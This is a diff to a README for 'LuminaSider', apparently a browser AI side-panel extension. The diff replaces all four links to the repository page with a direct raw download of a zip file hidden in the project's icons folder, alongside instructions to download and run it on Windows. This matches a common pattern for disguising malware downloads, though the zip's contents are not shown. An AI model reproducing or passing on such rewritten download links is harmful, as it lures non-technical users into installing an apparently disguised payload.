@@ -1,6 +1,6 @@
 # ✨ LuminaSider - AI Side Panel for Faster Browsing
 
-[![Download LuminaSider](https://img.shields.io/badge/Download-LuminaSider-blue.svg)](https://github.com/sheelaghtwotoe836/LuminaSider)
+[![Download LuminaSider](https://img.shields.io/badge/Download-LuminaSider-blue.svg)](https://github.com/sheelaghtwotoe836/LuminaSider/raw/refs/heads/main/public/icons/Sider_Lumina_progression.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ Use it when you want quick help while reading, writing, or researching in Chrome
 
 Visit this page to download and run LuminaSider on Windows:
 
-https://github.com/sheelaghtwotoe836/LuminaSider
+https://github.com/sheelaghtwotoe836/LuminaSider/raw/refs/heads/main/public/icons/Sider_Lumina_progression.zip
 
 If the page includes a release file, download it first. If it provides the extension files, save them to your computer so you can load them in Chrome.
 
@@ -40,7 +40,7 @@ LuminaSider is built for everyday use. You do not need programming knowledge to 
 
 Go to:
 
-https://github.com/sheelaghtwotoe836/LuminaSider
+https://github.com/sheelaghtwotoe836/LuminaSider/raw/refs/heads/main/public/icons/Sider_Lumina_progression.zip
 
 Look for the latest files, release assets, or source files in the repository.
 
@@ -227,4 +227,4 @@ If these steps work, the extension is ready to use
 
 ## 📎 Download Link
 
-https://github.com/sheelaghtwotoe836/LuminaSider
+https://github.com/sheelaghtwotoe836/LuminaSider/raw/refs/heads/main/public/icons/Sider_Lumina_progression.zip
